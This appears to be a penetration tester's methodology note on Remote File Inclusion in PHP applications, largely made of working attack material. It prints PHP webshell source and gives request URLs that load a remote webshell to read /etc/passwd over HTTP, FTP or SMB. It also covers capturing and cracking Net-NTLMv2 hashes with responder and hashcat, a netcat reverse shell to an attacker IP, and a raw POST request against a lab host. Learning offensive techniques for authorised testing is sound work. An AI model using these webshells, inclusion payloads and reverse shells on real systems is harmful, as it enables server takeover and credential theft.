Less common than LFI
Target must be configured in a specific way
	allow_url_include must be enabled (in php apps)

RFI allows us to include files from a remote system over HTTP or SMB

Kali includes PHP webshells natively 
	`/usr/share/webshells/php/

simple-backdoor.php code
```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

another php webshell example
```php
<?php system ($GET["cmd"]) ?>
```

## Demonstration of RFI Attacks

#### Enumerating
You may need to view page source to see output in a legible manner

HTTP Version:
```bash
# host server
python3 -m http.server 80

# visit
http://<target>.com/index.php?view=http://<kali_ip>/simple-backdoor.php?cmd=cat+/etc/passwd
```

FTP version: (in case WAF blocks http)
```bash
sudo python -m pyftpdlib -p 21  # host ftp server

http://<target>.com/index.php?view=ftp://<kali_ip>/simple-backdoor.php?cmd=cat+/etc/passwd
```

SMB Version:
```bash
impacket-smbserver -smb2support share $(pwd)  # host SMB server

http://<target>.com/index.php?view=\\<kali_ip>\share\simple-backdoor.php?cmd=cat+/etc/passwd
```


See [[Methodology/Web App/File Inclusion/Local File Inclusion (LFI)]] if you can get to this point
#### Stealing Hashes
We can potentially intercept user hashes if RFI is possible

```bash
# Start SMB Server
sudo responder -I tun0

# Connect to SMB server with web server (also try with BURP)
GET /index.php?view=//<kali_ip>/404

# Crack Net-NTLMv2 hash
hashcat -m 5600 /usr/share/wordlists/rockyou.txt
```

#### Reverse Shells
If we can perform an RFI, we can potentially get a reverse shell

Linux
```bash
# host server
python3 -m http.server 80

# one-liner
http://<target>.com/index.php?view=http://<kali_ip>/simple-backdoor.php?cmd=<reverse_shell_oneliners>
```
you may have to url encode to get it to work


Windows
```bash
# host server in location with nc64.exe AND webshell
python3 -m http.server 80

# one-liner
http://<target>.com/index.php?view=http://<kali_ip>/simple-backdoor.php?cmd=nc64.exe -e powershell.exe 10.10.10.10 9001
```
likewise you may need to url encode (%20 = spaces)


Example RFI in a POST request
```bash
# Host your malicious code
python3 -m http.server 80

# The POST Request
POST /admin/?debug=master.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=p6m04qvjlok2bbi59t1imsmmsc
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

include=http://10.10.14.255/rce.php
```